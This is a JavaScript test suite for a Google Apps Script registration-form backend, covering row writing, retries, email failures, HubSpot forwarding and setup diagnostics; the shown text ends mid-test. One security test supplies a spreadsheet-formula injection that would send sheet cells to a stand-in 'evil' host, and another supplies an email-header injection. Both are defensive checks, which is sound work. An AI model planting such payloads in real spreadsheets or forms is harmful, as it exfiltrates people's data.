/**
 * Tests for scripts/sheets/Code.gs.
 *
 * Run:  npm run test:sheets      (or: node scripts/sheets/Code.test.cjs)
 *
 * The previous version of this file could not run at all — it used `require`
 * in a package marked "type": "module", and it sat outside vitest's include
 * pattern, so nothing ever executed it. It is a .cjs file now and `npm run
 * verify` calls it, because a test suite nothing runs is decoration.
 *
 * The mock is deliberately honest in one place people usually cheat: Google
 * Sheets treats a leading apostrophe as a "keep this as text" flag and does NOT
 * return it from getValues(). The old suite asserted on the apostrophe coming
 * back out, which passes against a naive mock and would fail against real
 * Sheets. Here getValues() strips it, exactly as Sheets does, and the injection
 * tests assert on what was actually stored via a raw accessor.
 */
'use strict';

const fs = require('fs');
const path = require('path');
const vm = require('vm');

const SOURCE = fs.readFileSync(path.join(__dirname, 'Code.gs'), 'utf8');

let passed = 0;
let failed = 0;
const failures = [];

function check(name, fn) {
  try {
    fn();
    passed++;
  } catch (err) {
    failed++;
    failures.push(name + '\n      ' + (err && err.message ? err.message : err));
  }
}

function assert(cond, msg) {
  if (!cond) throw new Error(msg || 'assertion failed');
}

function eq(a, b, msg) {
  if (a !== b) throw new Error((msg || 'not equal') + ': got ' + JSON.stringify(a) +
    ', wanted ' + JSON.stringify(b));
}

// ---------------------------------------------------------------------------
// A small but faithful stand-in for the Apps Script services used.
// ---------------------------------------------------------------------------

function makeSheet(name, rows) {
  const grid = (rows || []).map(r => r.slice());
  let maxCols = grid.reduce((m, r) => Math.max(m, r.length), 0) || 26;
  const sheet = {
    name,
    hidden: [],
    deletedRows: [],
    _raw: grid,                       // what was actually stored
    getName: () => name,
    getLastRow: () => grid.length,
    getLastColumn: () => (grid[0] ? grid[0].length : 0),
    getMaxColumns: () => maxCols,
    insertColumnsAfter: (_after, n) => { maxCols += n; },
    appendRow: (row) => {
      const padded = row.slice();
      while (padded.length < (grid[0] ? grid[0].length : 0)) padded.push('');
      grid.push(padded);
    },
    getRange: (r, c, numRows = 1, numCols = 1) => ({
      // Sheets drops the leading text-flag apostrophe on read.
      getValues: () => {
        const out = [];
        for (let i = 0; i < numRows; i++) {
          const row = [];
          for (let j = 0; j < numCols; j++) {
            const v = (grid[r - 1 + i] || [])[c - 1 + j];
            row.push(typeof v === 'string' ? v.replace(/^'/, '') : (v === undefined ? '' : v));
          }
          out.push(row);
        }
        return out;
      },
      setValues: (vals) => {
        for (let i = 0; i < vals.length; i++) {
          const target = r - 1 + i;
          while (grid.length <= target) grid.push([]);
          for (let j = 0; j < vals[i].length; j++) grid[target][c - 1 + j] = vals[i][j];
        }
        return this;
      },
      setValue: (v) => {
        while (grid.length < r) grid.push([]);
        grid[r - 1][c - 1] = v;
      },
      setFontWeight: () => sheet._chain, setBackground: () => sheet._chain,
      setFontColor: () => sheet._chain, setFontFamily: () => sheet._chain,
      createFilter: () => { throw new Error('a filter already exists'); },
    }),
    setFrozenRows: () => {},
    setColumnWidth: () => {},
    hideColumns: (c) => { sheet.hidden.push(c); },
    deleteRow: (r) => { sheet.deletedRows.push(r); grid.splice(r - 1, 1); },
    deleteRows: (r, n) => { grid.splice(r - 1, n); },
  };
  sheet._chain = {
    setFontWeight: () => sheet._chain, setBackground: () => sheet._chain,
    setFontColor: () => sheet._chain, setFontFamily: () => sheet._chain,
  };
  return sheet;
}

function harness(opts = {}) {
  const sheets = {};
  Object.keys(opts.tabs || {}).forEach(n => { sheets[n] = makeSheet(n, opts.tabs[n]); });

  const mail = [];
  const props = {};
  const cache = {};
  const triggers = [];
  const logs = [];
  const fetches = [];   // every outbound UrlFetchApp call, for the HubSpot tests

  const ss = {
    getName: () => opts.sheetName || 'WWG Registrations',
    getUrl: () => 'https://docs.google.com/spreadsheets/d/TEST',
    getSpreadsheetTimeZone: () => opts.tz || 'UTC',
    getSheetByName: (n) => sheets[n] || null,
    insertSheet: (n) => { sheets[n] = makeSheet(n, []); return sheets[n]; },
  };

  const sandbox = {
    console: {
      log: (m) => logs.push(String(m)),
      warn: (m) => logs.push('WARN ' + m),
      error: (m) => logs.push('ERR ' + m),
    },
    SpreadsheetApp: { getActiveSpreadsheet: () => (opts.unbound ? null : ss) },
    MailApp: {
      sendEmail: (o) => {
        if (opts.mailThrows) throw new Error(opts.mailThrows);
        mail.push(o);
      },
      getRemainingDailyQuota: () => (opts.quota === undefined ? 90 : opts.quota),
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (k in props ? props[k] : null),
        setProperty: (k, v) => { props[k] = v; },
        getKeys: () => Object.keys(props),
        deleteProperty: (k) => { delete props[k]; },
      }),
    },
    CacheService: {
      getScriptCache: () => ({
        get: (k) => (k in cache ? cache[k] : null),
        put: (k, v) => { cache[k] = v; },
        remove: (k) => { delete cache[k]; },
      }),
    },
    LockService: {
      getScriptLock: () => ({
        tryLock: () => !opts.lockBusy,
        releaseLock: () => {},
      }),
    },
    ScriptApp: {
      getProjectTriggers: () => triggers.slice(),
      deleteTrigger: (t) => { triggers.splice(triggers.indexOf(t), 1); },
      newTrigger: (fn) => {
        const t = { fn, getHandlerFunction: () => fn };
        const builder = {
          timeBased: () => builder,
          everyDays: () => builder,
          atHour: () => builder,
          onWeekDay: () => builder,
          create: () => { triggers.push(t); return t; },
        };
        return builder;
      },
      WeekDay: { MONDAY: 'MON' },
      getService: () => ({ getUrl: () => opts.serviceUrl === undefined
        ? 'https://script.google.com/macros/s/AK/exec' : opts.serviceUrl }),
    },
    UrlFetchApp: {
      fetch: (url, options) => {
        fetches.push({ url, options: options || {} });
        if (opts.fetchThrows) throw new Error(opts.fetchThrows);
        return {
          getResponseCode: () => opts.fetchCode || 200,
          getContentText: () => opts.fetchBody || '{"ok":true,"content":{}}',
        };
      },
    },
    Utilities: {
      // Enough of a formatter for the patterns the code uses, and it honours
      // the timezone argument rather than ignoring it.
      formatDate: (d, tz, fmt) => {
        const shift = tz === 'America/New_York' ? -5 : 0;
        const t = new Date(d.getTime() + shift * 3600 * 1000);
        const p = (n) => String(n).padStart(2, '0');
        const months = ['January','February','March','April','May','June','July',
          'August','September','October','November','December'];
        if (fmt === 'yyyy-MM-dd') return `${t.getUTCFullYear()}-${p(t.getUTCMonth()+1)}-${p(t.getUTCDate())}`;
        if (fmt === 'MMMM yyyy') return `${months[t.getUTCMonth()]} ${t.getUTCFullYear()}`;
        if (fmt === 'yyyy-MM-dd HH:mm') {
          return `${t.getUTCFullYear()}-${p(t.getUTCMonth()+1)}-${p(t.getUTCDate())} ${p(t.getUTCHours())}:${p(t.getUTCMinutes())}`;
        }
        if (fmt === 'yyyyMMddHHmm') {
          return `${t.getUTCFullYear()}${p(t.getUTCMonth()+1)}${p(t.getUTCDate())}${p(t.getUTCHours())}${p(t.getUTCMinutes())}`;
        }
        return t.toISOString();
      },
      getUuid: () => 'uuid-' + Math.random().toString(36).slice(2),
    },
    ContentService: {
      MimeType: { JSON: 'application/json' },
      createTextOutput: (text) => ({
        text,
        setMimeType: function () { return this; },
        getContent: () => text,
      }),
    },
  };
  sandbox.globalThis = sandbox;
  vm.createContext(sandbox);
  vm.runInContext(SOURCE, sandbox, { filename: 'Code.gs' });

  return { api: sandbox, sheets, mail, props, cache, triggers, logs, fetches, ss };
}

/** A POST as the browser sends it: JSON body, text/plain content type. */
function post(api, fields) {
  const res = api.doPost({ postData: { contents: JSON.stringify(fields) }, parameter: {} });
  return JSON.parse(res.getContent());
}

function rowsOf(sheet) {
  return sheet._raw.slice(1);
}

function headerIndex(sheet, name) {
  return sheet._raw[0].indexOf(name);
}

const ROUNDTABLE_HEADERS = ['Month', 'Received', 'First Name', 'Last Name', 'Email',
  'Phone', 'Organization', 'Other', 'Notes', 'Ref'];

// ---------------------------------------------------------------------------
// The submission path
// ---------------------------------------------------------------------------

check('a submission writes a row and emails the full detail', () => {
  const h = harness();
  const out = post(h.api, {
    'form-name': 'roundtable', submissionId: 'abc-1',
    firstName: 'Ann', lastName: 'Ray', email: 'ann@example.com',
    phone: '555-0100', org: 'Grace Chapel',
  });
  eq(out.ok, true, 'reported ok');
  eq(out.emailed, true, 'reported emailed');
  const tab = h.sheets['Roundtable'];
  eq(rowsOf(tab).length, 1, 'one row written');
  const row = rowsOf(tab)[0];
  eq(row[headerIndex(tab, 'First Name')], 'Ann');
  eq(row[headerIndex(tab, 'Organization')], 'Grace Chapel');
  eq(row[headerIndex(tab, 'Ref')], 'abc-1');
  eq(h.mail.length, 1, 'one email');
  const body = h.mail[0].body;
  ['Ann', 'Ray', 'ann@example.com', '555-0100', 'Grace Chapel'].forEach(v => {
    assert(body.indexOf(v) >= 0, 'email body is missing ' + v);
  });
  eq(h.mail[0].replyTo, 'ann@example.com', 'reply-to is the submitter');
});

check('a retry with the same submissionId does not write a second row', () => {
  const h = harness();
  const f = { 'form-name': 'roundtable', submissionId: 'same-id',
              firstName: 'Ann', email: 'ann@example.com' };
  post(h.api, f);
  const second = post(h.api, f);
  eq(second.ok, true, 'retry still reports success to the visitor');
  eq(second.duplicate, true, 'retry recognised as a duplicate');
  eq(rowsOf(h.sheets['Roundtable']).length, 1, 'still one row');
  eq(h.mail.length, 1, 'not emailed twice');
});

check('two different people in the same minute both get recorded', () => {
  const h = harness();
  post(h.api, { 'form-name': 'roundtable', submissionId: 'a', firstName: 'Ann', email: 'a@x.com' });
  post(h.api, { 'form-name': 'roundtable', submissionId: 'b', firstName: 'Bob', email: 'b@x.com' });
  eq(rowsOf(h.sheets['Roundtable']).length, 2, 'both recorded');
});

// The defect the previous suite claimed to cover and did not: it asserted only
// that no duplicate appeared, which a total failure to write also satisfies.
check('owner inserts a column: the NEXT submission is still recorded', () => {
  const withExtra = ['Month', 'Received', 'First Name', 'Last Name', 'Email', 'Phone',
                     'Paid?', 'Organization', 'Other', 'Notes', 'Ref'];
  const h = harness({ tabs: { Roundtable: [withExtra,
    ['September 2026', '2026-09-01 10:00', 'Old', 'One', 'old@x.com', '', 'yes', '', '', '', 'n1']] } });
  const out = post(h.api, { 'form-name': 'roundtable', submissionId: 'new-1',
    firstName: 'Ann', lastName: 'Ray', email: 'ann@example.com', org: 'Grace Chapel' });
  eq(out.ok, true, 'accepted');
  const tab = h.sheets['Roundtable'];
  eq(rowsOf(tab).length, 2, 'the new registration was written');
  const row = rowsOf(tab)[1];
  eq(row[headerIndex(tab, 'First Name')], 'Ann', 'name under the right heading');
  eq(row[headerIndex(tab, 'Organization')], 'Grace Chapel', 'org is not shifted by the extra column');
  eq(row[headerIndex(tab, 'Paid?')], '', 'the owner\'s own column is left alone');
});

check('owner reorders columns: values still land under the right headings', () => {
  const reordered = ['Received', 'Month', 'Email', 'First Name', 'Last Name', 'Phone',
                     'Organization', 'Other', 'Notes', 'Ref'];
  const h = harness({ tabs: { Roundtable: [reordered] } });
  post(h.api, { 'form-name': 'roundtable', submissionId: 'x1',
                firstName: 'Ann', email: 'ann@example.com' });
  const tab = h.sheets['Roundtable'];
  const row = rowsOf(tab)[0];
  eq(row[headerIndex(tab, 'Email')], 'ann@example.com');
  eq(row[headerIndex(tab, 'First Name')], 'Ann');
});

check('a tab missing a heading gets it added, without losing existing rows', () => {
  const short = ['Month', 'Received', 'First Name', 'Last Name', 'Email'];
  const h = harness({ tabs: { Roundtable: [short,
    ['September 2026', '2026-09-01 10:00', 'Old', 'One', 'old@x.com']] } });
  post(h.api, { 'form-name': 'roundtable', submissionId: 'y1',
                firstName: 'Ann', email: 'ann@example.com', phone: '555' });
  const tab = h.sheets['Roundtable'];
  assert(headerIndex(tab, 'Phone') >= 0, 'Phone heading was added');
  assert(headerIndex(tab, 'Ref') >= 0, 'Ref heading was added');
  eq(rowsOf(tab).length, 2, 'the old row survived');
  eq(rowsOf(tab)[0][2], 'Old', 'the old row was not disturbed');
});

check('an existing but empty tab gets its headings written', () => {
  const h = harness({ tabs: { Roundtable: [] } });
  post(h.api, { 'form-name': 'roundtable', submissionId: 'z1', firstName: 'Ann', email: 'a@x.com' });
  const tab = h.sheets['Roundtable'];
  eq(tab._raw[0][0], 'Month', 'headings written into the empty tab');
  eq(rowsOf(tab).length, 1);
});

// ---------------------------------------------------------------------------
// Safety
// ---------------------------------------------------------------------------

check('a formula is stored as text, not as a formula', () => {
  const h = harness();
  post(h.api, { 'form-name': 'contact', submissionId: 'f1',
                name: '=IMAGE("https://evil/x?d="&JOIN(",",A1:E99))', email: 'a@x.com' });
  const tab = h.sheets['Contact'];
  const raw = tab._raw[1][headerIndex(tab, 'Name')];
  assert(raw.charAt(0) === "'", 'the stored value carries the text flag');
  // And what a reader gets back is the plain text, not an evaluated formula.
  const readBack = tab.getRange(2, headerIndex(tab, 'Name') + 1).getValues()[0][0];
  assert(readBack.indexOf('=IMAGE') === 0, 'reads back as inert text');
});

check('the honeypot drops a bot silently and writes nothing', () => {
  const h = harness();
  const out = post(h.api, { 'form-name': 'roundtable', submissionId: 'bot-1',
                            firstName: 'Bot', email: 'bot@x.com', 'bot-field': 'gotcha' });
  eq(out.ok, true, 'the bot is told nothing useful');
  assert(!h.sheets['Roundtable'] || rowsOf(h.sheets['Roundtable']).length === 0, 'no row');
  eq(h.mail.length, 0, 'no email');
});

check('personal data the browser attaches is not stored', () => {
  const h = harness();
  post(h.api, { 'form-name': 'contact', submissionId: 'p1', name: 'Ann', email: 'a@x.com',
                ip: '1.2.3.4', user_agent: 'Mozilla/5.0 ...', referrer: 'https://x.com' });
  const tab = h.sheets['Contact'];
  const other = rowsOf(tab)[0][headerIndex(tab, 'Other')];
  ['1.2.3.4', 'Mozilla', 'referrer'].forEach(v => {
    assert(String(other).indexOf(v) < 0, 'leaked ' + v + ' into the sheet');
  });
});

check('an oversized body is refused and does not write a row', () => {
  const h = harness();
  const res = h.api.doPost({ postData: { contents: 'x'.repeat(100001) }, parameter: {} });
  const out = JSON.parse(res.getContent());
  eq(out.ok, false, 'refused');
  assert(!h.sheets['Roundtable'], 'nothing written');
});

check('garbage input never throws, it answers', () => {
  const h = harness();
  const cases = [
    { postData: { contents: 'not json at all {{{' }, parameter: {} },
    { postData: { contents: '{"broken":' }, parameter: {} },
    { postData: { contents: '' }, parameter: {} },
    {},
  ];
  cases.forEach((e, i) => {
    const res = h.api.doPost(e);
    const out = JSON.parse(res.getContent());
    assert(typeof out.ok === 'boolean', 'case ' + i + ' returned a usable answer');
  });
});

check('the email subject cannot carry newlines or run long', () => {
  const h = harness();
  post(h.api, { 'form-name': 'contact', submissionId: 's1', email: 'a@x.com',
                name: 'Ann\nBcc: someone@else.com\n' + 'x'.repeat(300) });
  eq(h.mail.length, 1);
  assert(h.mail[0].subject.indexOf('\n') < 0, 'no newline in the subject');
  assert(h.mail[0].subject.length <= 120, 'subject is capped');
});

check('a junk value in the email field is not used as reply-to', () => {
  const h = harness();
  post(h.api, { 'form-name': 'contact', submissionId: 'r1', name: 'Ann', email: 'not-an-address' });
  eq(h.mail.length, 1);
  eq(h.mail[0].replyTo, undefined, 'reply-to left unset');
});

// ---------------------------------------------------------------------------
// Failure behaviour — the defect that mattered most
// ---------------------------------------------------------------------------

check('email failure still writes the row AND says so on the Status tab', () => {
  const h = harness({ mailThrows: 'quota exhausted' });
  const out = post(h.api, { 'form-name': 'roundtable', submissionId: 'm1',
                            firstName: 'Ann', email: 'ann@example.com' });
  eq(out.ok, true, 'the visitor is not told it failed — it did not');
  eq(out.emailed, false, 'but the answer records that no email went');
  eq(rowsOf(h.sheets['Roundtable']).length, 1, 'the registration is safe');
  const status = h.sheets['Status'];
  assert(status, 'a Status tab exists');
  const text = status._raw.map(r => r.join(' ')).join('\n');
  assert(/did NOT send|not send/i.test(text), 'Status records the failure, not "all good"');
});

check('the daily check does not report all fine after an email failure', () => {
  const h = harness({ mailThrows: 'quota exhausted' });
  post(h.api, { 'form-name': 'roundtable', submissionId: 'm2', firstName: 'Ann', email: 'a@x.com' });
  h.api.dailyCheck();
  const text = h.sheets['Status']._raw.map(r => r.join(' ')).join('\n');
  assert(/an email failed to send today/i.test(text), 'the day\'s failure is carried into the check');
});

check('past the daily email ceiling, rows are still written', () => {
  const h = harness();
  // Well past any sane ceiling. A number rather than the constant itself
  // because a top-level `const` in Apps Script is not reachable from here —
  // and if the ceiling check were ever deleted, this test would still catch it.
  h.props['sent:' + h.api.todayKey('UTC')] = '9999';
  const out = post(h.api, { 'form-name': 'roundtable', submissionId: 'c1',
                            firstName: 'Ann', email: 'a@x.com' });
  eq(out.ok, true);
  eq(out.emailed, false, 'email paused');
  eq(rowsOf(h.sheets['Roundtable']).length, 1, 'row still written');
});

check('a repeated fault emails once, not once per submission', () => {
  const h = harness({ mailThrows: 'quota exhausted' });
  for (let i = 0; i < 5; i++) {
    post(h.api, { 'form-name': 'roundtable', submissionId: 'rep-' + i,
                  firstName: 'P' + i, email: 'p' + i + '@x.com' });
  }
  eq(rowsOf(h.sheets['Roundtable']).length, 5, 'all five safe');
  const perSubmission = h.sheets['Status']._raw
    .filter(r => /^A submission was saved/.test(String(r[1] || '')));
  eq(perSubmission.length, 5, 'every one is individually recorded on Status');
  // ...but the alert itself is throttled to one a day, so a fault that repeats
  // cannot bury the Status tab under the same line.
  const alerts = h.sheets['Status']._raw
    .filter(r => /^Working With God .* email did not send/.test(String(r[1] || '')));
  eq(alerts.length, 1, 'the alert is raised once, not once per submission');
});

check('an unknown form is recorded rather than rejected', () => {
  const h = harness();
  const out = post(h.api, { 'form-name': 'newsletter', submissionId: 'u1',
                            name: 'Ann', email: 'a@x.com', interest: 'weekly' });
  eq(out.ok, true);
  const tab = h.sheets['Other'];
  assert(tab, 'it went to the Other tab');
  eq(rowsOf(tab).length, 1);
  assert(String(rowsOf(tab)[0][headerIndex(tab, 'Other')]).indexOf('interest') >= 0,
    'the unexpected field was kept, not dropped');
});

check('a field with no column of its own is kept in Other', () => {
  const h = harness();
  post(h.api, { 'form-name': 'roundtable', submissionId: 'e1', firstName: 'Ann',
                email: 'a@x.com', heardAbout: 'a friend' });
  const tab = h.sheets['Roundtable'];
  const other = String(rowsOf(tab)[0][headerIndex(tab, 'Other')]);
  assert(other.indexOf('heardAbout: a friend') >= 0, 'kept: ' + other);
});

check('a form-encoded post still works, so an old build keeps functioning', () => {
  const h = harness();
  const res = h.api.doPost({
    postData: { contents: 'form-name=roundtable&submissionId=fe1&firstName=Ann&email=ann%40x.com' },
    parameter: {},
  });
  eq(JSON.parse(res.getContent()).ok, true);
  eq(rowsOf(h.sheets['Roundtable']).length, 1);
});

check('the sheet timezone is respected, not assumed to be UTC', () => {
  const h = harness({ tz: 'America/New_York' });
  post(h.api, { 'form-name': 'roundtable', submissionId: 'tz1', firstName: 'Ann', email: 'a@x.com' });
  const tab = h.sheets['Roundtable'];
  const received = String(rowsOf(tab)[0][headerIndex(tab, 'Received')]);
  assert(/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}$/.test(received), 'formatted: ' + received);
});

// ---------------------------------------------------------------------------
// Site content — the sponsor, editable with no deploy
// ---------------------------------------------------------------------------

check('doGet returns the content tab as data', () => {
  const h = harness({ tabs: { 'Site content': [
    ['Setting', 'Value', 'What this changes'],
    ['sponsor.name', 'Jane Cohen', ''],
    ['sponsor.href', 'https://example.com', ''],
    ['roundtable.next', 'October 21st', ''],
  ] } });
  const out = JSON.parse(h.api.doGet({ parameter: { what: 'content' } }).getContent());
  eq(out.ok, true);
  eq(out.content.sponsor.name, 'Jane Cohen');
  eq(out.content.sponsor.href, 'https://example.com');
  eq(out.content.roundtable.next, 'October 21st');
});

check('doGet leaks nothing about the spreadsheet itself', () => {
  const h = harness({ sheetName: 'WWG Registrations (private)', tabs: { 'Site content': [
    ['Setting', 'Value', ''], ['sponsor.name', 'Jane', ''],
  ] } });
  const text = h.api.doGet({ parameter: { what: 'content' } }).getContent();
  ['WWG Registrations', 'Roundtable', 'docs.google.com', 'eliyahu@'].forEach(v => {
    assert(text.indexOf(v) < 0, 'leaked ' + v);
  });
});

check('doGet is cached, so a burst of visitors is one read', () => {
  const h = harness({ tabs: { 'Site content': [
    ['Setting', 'Value', ''], ['sponsor.name', 'Jane', ''],
  ] } });
  h.api.doGet({ parameter: { what: 'content' } });
  // Change the sheet underneath; the cached answer should still be served.
  h.sheets['Site content']._raw[1][1] = 'Someone Else';
  const out = JSON.parse(h.api.doGet({ parameter: { what: 'content' } }).getContent());
  eq(out.content.sponsor.name, 'Jane', 'served from cache');
  h.api.publishContentNow();
  const after = JSON.parse(h.api.doGet({ parameter: { what: 'content' } }).getContent());
  eq(after.content.sponsor.name, 'Someone Else', 'publishing clears the cache');
});

check('a missing content tab does not break the endpoint', () => {
  const h = harness();
  const out = JSON.parse(h.api.doGet({ parameter: { what: 'content' } }).getContent());
  eq(out.ok, true, 'still answers');
});

// ---------------------------------------------------------------------------
// HubSpot — optional, additive, must never be able to break a submission
// ---------------------------------------------------------------------------

check('with HubSpot unconfigured, nothing is called and nothing is logged', () => {
  const h = harness({ fetchThrows: 'should not have been called' });
  const out = post(h.api, { 'form-name': 'roundtable', submissionId: 'hs0',
                            firstName: 'Ann', email: 'a@x.com' });
  eq(out.ok, true);
  eq(rowsOf(h.sheets['Roundtable']).length, 1);
  const status = h.sheets['Status']._raw.map(r => r.join(' ')).join('\n');
  assert(status.indexOf('HubSpot') < 0, 'said nothing about HubSpot: ' + status);
});

check('with HubSpot configured, the submission is forwarded', () => {
  const h = harness();
  h.props['HUBSPOT_PORTAL_ID'] = '12345678';
  h.props['HUBSPOT_FORM_ROUNDTABLE'] = 'guid-abc';
  post(h.api, { 'form-name': 'roundtable', submissionId: 'hs1', firstName: 'Ann',
                lastName: 'Ray', email: 'ann@x.com', phone: '555', org: 'Grace Chapel' });
  eq(h.fetches.length, 1, 'one call to HubSpot');
  const call = h.fetches[0];
  assert(call.url.indexOf('/submit/12345678/guid-abc') > 0, 'url was ' + call.url);
  const body = JSON.parse(call.options.payload);
  const byName = {};
  body.fields.forEach(f => { byName[f.name] = f.value; });
  eq(byName.email, 'ann@x.com');
  eq(byName.firstname, 'Ann');
  eq(byName.lastname, 'Ray');
  eq(byName.company, 'Grace Chapel', 'org maps to HubSpot company');
  body.fields.forEach(f => eq(f.objectTypeId, '0-1', 'every field is a contact field'));
});

check('page details go in context, never in fields', () => {
  // HubSpot rejects the whole submission with a 400 if a field is sent that
  // the form does not declare, and pageUri is the classic way people trip it.
  const h = harness();
  h.props['HUBSPOT_PORTAL_ID'] = '1';
  h.props['HUBSPOT_FORM_CONTACT'] = 'g';
  post(h.api, { 'form-name': 'contact', submissionId: 'hs2', name: 'Ann',
                email: 'a@x.com', message: 'hello' });
  const body = JSON.parse(h.fetches[0].options.payload);
  const names = body.fields.map(f => f.name);
  ['pageUri', 'pageName', 'pageUrl', 'pageTitle'].forEach(n => {
    assert(names.indexOf(n) < 0, n + ' must not be a field');
  });
  assert(body.context && body.context.pageUri, 'pageUri belongs in context');
});

check('the daily quote list is deliberately NOT sent to HubSpot', () => {
  const h = harness();
  h.props['HUBSPOT_PORTAL_ID'] = '1';
  h.props['HUBSPOT_FORM_DAILYQUOTE'] = 'g';
  post(h.api, { 'form-name': 'dailyQuote', submissionId: 'hs3', name: 'Ann', email: 'a@x.com' });
  eq(h.fetches.length, 0, 'no call made');
  eq(rowsOf(h.sheets['Daily quote']).length, 1, 'but still recorded in the sheet');
});

check('a HubSpot outage does not affect the row, the email, or the visitor', () => {
  const h = harness({ fetchThrows: 'connection reset' });
  h.props['HUBSPOT_PORTAL_ID'] = '1';
  h.props['HUBSPOT_FORM_ROUNDTABLE'] = 'g';
  const out = post(h.api, { 'form-name': 'roundtable', submissionId: 'hs4',
                            firstName: 'Ann', email: 'a@x.com' });
  eq(out.ok, true, 'the visitor is told it worked, because it did');
  eq(out.emailed, true, 'the email still went');
  eq(rowsOf(h.sheets['Roundtable']).length, 1, 'the row is there');
  const status = h.sheets['Status']._raw.map(r => r.join(' ')).join('\n');
  assert(/HubSpot copy did not go through/.test(status), 'but it is recorded: ' + status);
});

check('a HubSpot 400 is recorded with its reason, not swallowed', () => {
  const h = harness({ fetchCode: 400, fetchBody: '{"status":"error","message":"FIELD_NOT_IN_FORM_DEFINITION"}' });
  h.props['HUBSPOT_PORTAL_ID'] = '1';
  h.props['HUBSPOT_FORM_ROUNDTABLE'] = 'g';
  post(h.api, { 'form-name': 'roundtable', submissionId: 'hs5', firstName: 'Ann', email: 'a@x.com' });
  const status = h.sheets['Status']._raw.map(r => r.join(' ')).join('\n');
  assert(/FIELD_NOT_IN_FORM_DEFINITION/.test(status), 'the reason is kept: ' + status);
  eq(rowsOf(h.sheets['Roundtable']).length, 1, 'row unaffected');
});

check('empty values are not sent to HubSpot', () => {
  const h = harness();
  h.props['HUBSPOT_PORTAL_ID'] = '1';
  h.props['HUBSPOT_FORM_ROUNDTABLE'] = 'g';
  post(h.api, { 'form-name': 'roundtable', submissionId: 'hs6',
                firstName: 'Ann', email: 'a@x.com', phone: '', org: '   ' });
  const body = JSON.parse(h.fetches[0].options.payload);
  const names = body.fields.map(f => f.name);
  assert(names.indexOf('phone') < 0, 'blank phone was sent');
  assert(names.indexOf('company') < 0, 'whitespace-only org was sent');
});

check('diagnose reports HubSpot as optional when it is not set up', () => {
  const h = harness();
  const out = h.api.diagnose();
  assert(/HubSpot: not set up/.test(out), 'did not mention it:\n' + out);
  assert(/VERDICT: every check passed/.test(out), 'unconfigured HubSpot must not be a failure');
});

check('diagnose flags a half-configured HubSpot', () => {
  const h = harness();
  h.props['HUBSPOT_PORTAL_ID'] = '12345678';
  h.props['HUBSPOT_FORM_ROUNDTABLE'] = 'g';
  const out = h.api.diagnose();
  assert(/no form id for: contact/.test(out), 'did not name the gap:\n' + out);
});

// ---------------------------------------------------------------------------
// Setup and diagnosis
// ---------------------------------------------------------------------------

check('setup creates the tabs and exactly one of each trigger', () => {
  const h = harness();
  h.api.setup();
  ['Roundtable', 'Contact', 'Daily quote', 'Site content', 'Status'].forEach(n => {
    assert(h.sheets[n], 'missing tab: ' + n);
  });
  const names = h.triggers.map(t => t.getHandlerFunction()).sort();
  eq(names.join(','), 'dailyCheck,weeklyDigest');
});

check('running setup twice does not double the triggers', () => {
  const h = harness();
  h.api.setup();
  h.api.setup();
  eq(h.triggers.length, 2, 'still two');
});

check('setup still finishes and says so when the test email fails', () => {
  const h = harness({ mailThrows: 'no quota' });
  const out = h.api.setup();
  assert(/COULD NOT SEND THE TEST EMAIL/.test(out), 'the failure is reported, not swallowed');
  assert(h.sheets['Roundtable'], 'the tabs were still created');
});

check('diagnose passes cleanly on a healthy setup', () => {
  const h = harness({ tabs: { 'Site content': [
    ['Setting', 'Value', ''], ['sponsor.name', 'Jane', ''], ['roundtable.next', 'October 21st', ''],
  ] } });
  h.api.setup();
  const out = h.api.diagnose();
  assert(/VERDICT: every check passed/.test(out), 'verdict was:\n' + out);
});

check('diagnose names the problem when the script is not attached to a sheet', () => {
  const h = harness({ unbound: true });
  const out = h.api.diagnose();
  assert(/not attached to any spreadsheet/i.test(out), 'did not name it:\n' + out);
  assert(/VERDICT:/.test(out), 'still reached a verdict');
});

check('diagnose catches a /dev address instead of /exec', () => {
  const h = harness({ serviceUrl: 'https://script.google.com/macros/s/AK/dev' });
  const out = h.api.diagnose();
  assert(/ends \/dev/.test(out), 'did not flag it:\n' + out);
});

check('diagnose catches an unpublished script', () => {
  const h = harness({ serviceUrl: null });
  const out = h.api.diagnose();
  assert(/has not been published/.test(out), 'did not flag it:\n' + out);
});

check('diagnose catches the sign-in wall from the wrong access setting', () => {
  const h = harness({ fetchCode: 401, fetchBody: '<html>Sign in to continue</html>' });
  const out = h.api.diagnose();
  assert(/asks for a Google sign-in/.test(out), 'did not flag it:\n' + out);
  assert(/Who has access: ANYONE/.test(out), 'did not give the fix');
});

check('diagnose reports every broken tab, not just the first', () => {
  const h = harness({ tabs: {
    Roundtable: [['Month', 'Received', 'First Name']],
    Contact:    [['Month', 'Received', 'Name']],
  } });
  const out = h.api.diagnose();
  assert(/Tab "Roundtable".*is missing/.test(out), 'Roundtable not reported');
  assert(/Tab "Contact".*is missing/.test(out), 'Contact not reported');
});

check('diagnose cleans up the test row it writes', () => {
  const h = harness();
  h.api.diagnose();
  const tab = h.sheets['Other'];
  if (tab) eq(rowsOf(tab).length, 0, 'the self-test row was removed');
});

check('diagnose never throws, even when everything is broken', () => {
  const h = harness({ unbound: true, mailThrows: 'dead', fetchThrows: 'dead', serviceUrl: null });
  const out = h.api.diagnose();
  assert(typeof out === 'string' && out.length > 0, 'returned a report anyway');
});

check('the weekly digest counts recent rows and always sends', () => {
  const now = new Date();
  const p = (n) => String(n).padStart(2, '0');
  const stamp = (d) => `${d.getUTCFullYear()}-${p(d.getUTCMonth()+1)}-${p(d.getUTCDate())} 10:00`;
  const recent = stamp(new Date(now.getTime() - 2 * 24 * 3600 * 1000));
  const old = stamp(new Date(now.getTime() - 60 * 24 * 3600 * 1000));
  const h = harness({ tabs: { Roundtable: [ROUNDTABLE_HEADERS,
    ['x', recent, 'Ann', '', 'a@x.com', '', '', '', '', 'r1'],
    ['x', old,    'Old', '', 'o@x.com', '', '', '', '', 'r2']] } });
  h.api.weeklyDigest();
  eq(h.mail.length, 1, 'the Monday email always goes');
  assert(/1 submission/.test(h.mail[0].subject), 'subject was: ' + h.mail[0].subject);
  assert(/Roundtable: 1/.test(h.mail[0].body), 'body was:\n' + h.mail[0].body);
});

check('the weekly digest still sends when there is nothing to report', () => {
  const h = harness();
  h.api.weeklyDigest();
  eq(h.mail.length, 1, 'silence is not an option — the email itself is the signal');
  assert(/0 submissions/.test(h.mail[0].subject), h.mail[0].subject);
});

check('cosmetic formatting failures never cost a submission', () => {
  // The mock's createFilter always throws, as it does on a sheet that already
  // has a filter. The write must survive it.
  const h = harness();
